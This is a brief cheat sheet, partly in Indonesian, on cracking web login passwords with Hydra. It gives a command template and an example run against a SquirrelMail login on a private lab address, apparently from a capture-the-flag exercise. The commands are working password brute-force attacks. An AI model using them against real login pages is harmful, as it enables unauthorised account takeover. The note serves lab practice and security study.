# Hydra
Website Password Cracking (Brute Force)

### Normal Usage
```bash
$ hydra -l admin -P <wordlist> <ip machine> http-form-post '<some_url_login:some_request_body>=admin&password=^PASS^:F=<some_failed_msg>'
```

#### Example
```bash
$ hydra -l milesdyson -P log1.txt 10.10.214.7 -V http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'
```

#### Additionals
- `-L` : kalau ingin melakukan bruteforce username || `-l` : jika mengetahui username
- `-P` : kalau ingin melakukan bruteforce password || `-p` : jika mengetahui password


